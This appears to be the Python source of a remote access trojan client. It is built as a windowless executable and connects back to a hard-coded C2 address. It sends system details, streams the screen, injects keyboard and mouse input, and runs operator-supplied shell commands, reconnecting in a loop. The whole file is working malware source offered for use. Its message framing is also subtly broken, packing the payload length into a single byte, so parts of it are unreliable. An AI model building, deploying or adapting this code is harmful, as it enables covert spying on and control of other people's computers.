# netkit/rat_client.py — Python payload variant (LAN testing).
# Build with pyinstaller -F -w. Edit DEFAULT_C2 before building.
import argparse
import io
import json
import os
import platform
import socket
import struct
import subprocess
import sys
import threading
import time

import mss
import numpy as np
from PIL import Image
from pynput.keyboard import Controller as KeyboardController, Key
from pynput.mouse import Button, Controller as MouseController

DEFAULT_C2 = "192.168.1.10:4444"

MSG_HELLO, MSG_FRAME, MSG_INPUT, MSG_CMD, MSG_CMD_OUT = 0, 1, 2, 3, 4

SPECIAL_KEYS = {
    "enter": Key.enter, "esc": Key.esc, "backspace": Key.backspace, "tab": Key.tab,
    "space": Key.space, "shift": Key.shift, "ctrl": Key.ctrl, "alt": Key.alt,
    "win": Key.cmd, "caps_lock": Key.caps_lock, "delete": Key.delete,
    "home": Key.home, "end": Key.end, "page_up": Key.page_up, "page_down": Key.page_down,
    "up": Key.up, "down": Key.down, "left": Key.left, "right": Key.right,
    "print_screen": Key.print_screen, "menu": Key.menu,
}
for _i in range(1, 13):
    SPECIAL_KEYS["f%d" % _i] = getattr(Key, "f%d" % _i)


def send_msg(sock, mtype, payload=b""):
    sock.sendall(struct.pack("<IB", mtype, len(payload)) + payload)


def recv_exact(sock, n):
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("closed")
        buf += chunk
    return buf


def recv_msg(sock):
    mtype, length = struct.unpack("<IB", recv_exact(sock, 5))
    return mtype, recv_exact(sock, length)


class InputInjector:
    def __init__(self):
        self.mouse = MouseController()
        self.kb = KeyboardController()
        self.sct = mss.mss()
        self.mon = self.sct.monitors[1]  # primary; offsets handle negative origins

    def _abs(self, nx, ny):
        return (
            int(self.mon["left"] + nx * self.mon["width"]),
            int(self.mon["top"] + ny * self.mon["height"]),
        )

    def apply(self, ev):
        t = ev.get("t")
        if t == "m":
            self.mouse.position = self._abs(ev["x"], ev["y"])
        elif t == "c":
            if "x" in ev:
                self.mouse.position = self._abs(ev["x"], ev["y"])
            btn = Button.left if ev.get("b", 1) == 1 else Button.right
            (self.mouse.press if ev.get("d") else self.mouse.release)(btn)
        elif t == "s":
            if "x" in ev:
                self.mouse.position = self._abs(ev["x"], ev["y"])
            self.mouse.scroll(0, int(ev.get("d", 0)))
        elif t == "k":
            key = SPECIAL_KEYS.get(ev["k"], ev["k"])
            (self.kb.press if ev.get("d") else self.kb.release)(key)


def run_cmd(cmd):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, timeout=30)
        out = (r.stdout or b"") + (r.stderr or b"")
    except subprocess.TimeoutExpired:
        out = b"[timeout after 30s]"
    except Exception as e:
        out = str(e).encode()
    return out.decode(errors="replace")[:8000]


class ScreenStream:
    def __init__(self, quality, scale):
        self.quality, self.scale = quality, scale
        self.sct = mss.mss()
        self.mon = self.sct.monitors[1]

    def grab_jpeg(self):
        raw = self.sct.grab(self.mon)
        img = Image.frombytes("RGB", raw.size, raw.bgra, "raw", "BGRX")
        if self.scale != 1.0:
            img = img.resize(
                (int(img.width * self.scale), int(img.height * self.scale)),
                Image.BILINEAR,
            )
        buf = io.BytesIO()
        img.save(buf, "JPEG", quality=self.quality)
        return buf.getvalue()


def session(c2_host, c2_port, quality, scale, fps, shell):
    s = socket.create_connection((c2_host, c2_port), timeout=10)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    hello = {
        "host": platform.node(),
        "user": os.environ.get("USERNAME") or os.environ.get("USER") or "?",
        "os": "%s %s" % (platform.system(), platform.release()),
        "ip": s.getsockname()[0],
    }
    send_msg(s, MSG_HELLO, json.dumps(hello).encode())
    inj = InputInjector()

    def reader():
        while True:
            mtype, payload = recv_msg(s)
            if mtype == MSG_INPUT:
                inj.apply(json.loads(payload))
            elif mtype == MSG_CMD and shell:
                out = run_cmd(payload.decode(errors="replace"))
                send_msg(s, MSG_CMD_OUT, json.dumps({"out": out}).encode())

    threading.Thread(target=reader, daemon=True).start()

    stream = ScreenStream(quality, scale)
    interval = 1.0 / fps
    while True:
        t0 = time.time()
        send_msg(s, MSG_FRAME, stream.grab_jpeg())
        dt = time.time() - t0
        if dt < interval:
            time.sleep(interval - dt)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--c2", default=DEFAULT_C2, help="host:port")
    ap.add_argument("--quality", type=int, default=60)
    ap.add_argument("--scale", type=float, default=0.75)
    ap.add_argument("--fps", type=float, default=15)
    ap.add_argument("--no-shell", action="store_true")
    args = ap.parse_args()

    host, _, port = args.c2.rpartition(":")
    port = int(port)
    while True:
        try:
            session(host, port, args.quality, args.scale, args.fps, not args.no_shell)
        except Exception:
            time.sleep(5)


if __name__ == "__main__":
    main()
